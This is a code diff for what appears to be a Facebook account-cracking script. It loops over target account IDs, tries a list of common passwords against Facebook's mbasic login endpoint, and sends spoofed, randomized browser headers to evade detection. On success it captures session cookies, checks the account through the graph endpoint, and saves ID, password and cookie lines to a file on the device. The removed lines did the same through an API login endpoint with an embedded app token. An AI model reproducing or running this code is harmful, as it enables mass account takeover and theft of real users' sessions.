@@ -82,6 +82,25 @@ class sort:
         return cx
 
 
+def lsb():
+    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
+    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
+    number = ''.join(random.choices(string.digits, k=1))
+    password = upper + lower + number
+    password_list = list(password)
+    random.shuffle(password_list)
+    return ''.join(password_list)
+
+
+def referer():
+    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
+    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
+    number = ''.join(random.choices(string.digits, k=5))
+    password = upper + lower + number
+    password_list = list(password)
+    random.shuffle(password_list)
+    return ''.join(password_list)
+
 oks = []
 loop = 0
 
@@ -161,48 +180,75 @@ def old():
 
 def login(uid, meth):
     global oks, loop
-    Session = requests.session()
+    fb = "mbasic"
+    session = requests.session()
     try:
         sys.stdout.write(
             f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
         sys.stdout.flush()
         for pw in ["123456", "12345678", "password", "654321", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "iloveyou", "sadiya", "jannat", "bangladesh", "১২৩৪৫৬", "77889900"]:
-            if meth in ["1", "01", "A", "a"]:
-                agent = uaxxxx()
-            else:
-                agent = Samsung()
-            headers = {
-                "x-fb-connection-bandwidth": str(random.randint(200000000, 300000000)),
-                "x-fb-sim-hni": str(random.randint(20000, 40000)),
-                "x-fb-net-hni": str(random.randint(20000, 40000)),
-                "x-fb-connection-quality": "EXCELLENT",
-                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-                "user-agent": agent,
-                "content-type": "application/x-www-form-urlencoded",
-                "x-fb-http-engine": "Liger"}
-            rp = Session.get(
-                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
-                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type"
-                          "=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0"
-                          "&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos"
-                          ".headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728"
-                          "|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
-                headers=headers).json()
-            
-            if "session_key" in rp:
-                oks.append(uid)
-                coki = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
-                print(
-                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}\n {coki}")
-                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
-                break
-            elif "Please Confirm Email" in str(rp):
-                oks.append(uid)
-                print(
-                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
-                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
-                break
+            free_fb = session.get(f'https://{fb}.facebook.com').text
+            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
+                    "unrecognized_tries": "0", "email": uid, "pass": pw, "login": "Log In"}
+            uax = uaxxxx()
+            ver1 = str(random.randrange(1, 99))
+            ver2 = str(random.randrange(90, 121))
+            lsd = lsb()
+            refer = referer()
+            dpr = str(random.randrange(2, 6))
+            sceme = random.choice(['light', 'dark'])
+            had = {
+                'Host': f'{fb}.facebook.com',
+                'content-length': str(random.randrange(1600, 1800, 10)),
+                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
+                'sec-ch-ua-mobile': '?1',
+                'user-agent': uax,
+                'x-response-format': 'JSONStream',
+                'content-type': 'application/x-www-form-urlencoded',
+                'x-fb-lsd': lsd,
+                'viewport-width': '360',
+                'sec-ch-ua-platform-version': '""',
+                'x-requested-with': 'XMLHttpRequest',
+                'x-asbd-id': '129477',
+                'dpr': dpr,
+                'sec-ch-ua-full-version-list': '',
+                'sec-ch-ua-model': '""',
+                'sec-ch-prefers-color-scheme': sceme,
+                'sec-ch-ua-platform': '"Android"',
+                'accept': '*/*',
+                'origin': f'https://{fb}.facebook.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
+                'accept-encoding': 'gzip, deflate, br,',
+                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
+            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            session.post(url=url, data=info, headers=had)
+            heron_brand = session.cookies.get_dict().keys()
+            if "c_user" in heron_brand:
+                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                xx = coki.split("c_user=")[1]
+                xd = xx[:15]
+                res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
+                try:
+                    if "height" in res["data"]:
+                        print(f"\r\r[PRINCE-OK] {xd} • {pw}\n[🍪][spring_green1]{coki}")
+                        open("/sdcard/SD-OK.txt", "a").write(xd + "|" + pw + "|" + coki + "\n")
+                        oks.append(xd)
+                        break
+                except KeyError:
+                    pass
 
+
+            elif "checkpoint" in heron_brand:
+                # coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+
+                # print(f"\r\r[green] [OK-ID] {uid} | {ps} \n [🤫]{coki}")
+                pass
             else:
                 continue
         loop += 1
